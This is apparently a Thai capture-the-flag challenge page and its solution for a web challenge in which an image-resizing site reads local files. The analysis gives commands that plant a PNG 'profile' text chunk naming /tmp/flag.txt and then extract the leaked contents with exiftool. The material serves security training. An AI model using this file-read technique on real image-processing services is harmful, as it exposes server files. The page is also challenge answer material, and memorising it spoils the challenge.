# QuickScale Studio

| Category | Difficulty | Point |
| :-: | :-: | :-: |
| Web | Hard | 500 |

สมควรเขาได้ประสบปัญหากับการที่จะอยากย่อขนาดรูป แต่ด้วยที่เขาเป็น dev สุดเท่ห์ การจะเข้าไปตัดรูปใน Photoshop คงง่ายเกินไปสำหรับเขา เขาจึงทำเว็บไซต์ที่สามารถย่อภาพได้ตั้งแต่ 25% - 100% และด้วยการที่จะทำแล้วไว้ใช้คนเดียวคงจะน่าเสียดายแย่ เขาจึงเปิดให้ใช้ฟรี และเวลาก็ล่วงเลยมามากกว่า 2 ปี ในฐานะที่คุณเป็น Cyber Security คุณจึงแนะนำให้ สมชายเช็ค GitHub repo project ว่าโดนเตือนเรื่อง ใช้ version ที่มีช่องโหว่ไหม แต่เขาไม่สนใจ เพราะเขามั่นใจว่าเรามีระบบป้องกันการโจมตีโดย injection อย่างดี และบอกกับคุณว่าถ้าแน่จริงก็ลอง hack แล้วบอกว่าค่าในไฟล์ /tmp/flag.txt คืออะไรหน่อยสิ ทำไม่ได้ล่ะสิหึ

Format: `CSUBRU{...}`

---

## Hints

no hint

---

## Configuration

| Name | Value |
| :- | :- |
| Title | QuickScale Studio |
| Type | Dynamic Container |
| Category | Web |
| Max Attempts Allowed | Unlimited |
| Blood Bonus | Enable |
| Container Image | `ic-quick-scale-studio` |
| Service Port | 80 |
| CPU Limit (0.1 CPUs) | 1 |
| Memory Limit (MB) | 128 |
| Storage Limit (MB) | 512 |

### Flags

- `CSUBRU{...}`

---

## Analysis

1. สร้าง PNG ที่แทรก text profile ชี้ไปที่ `/tmp/flag.txt`

   ```bash
   pngcrush -text a "profile" "/tmp/flag.txt" test.png payload.png
   ```

2. อัปโหลดไฟล์ payload แล้วดาวน์โหลดรูปที่เว็บประมวลผลให้
3. อ่านข้อมูลโปรไฟล์ที่ฝังมา

   ```bash
   exiftool -b payload.png
   ```

4. ข้อความที่เปิดได้คือ flag
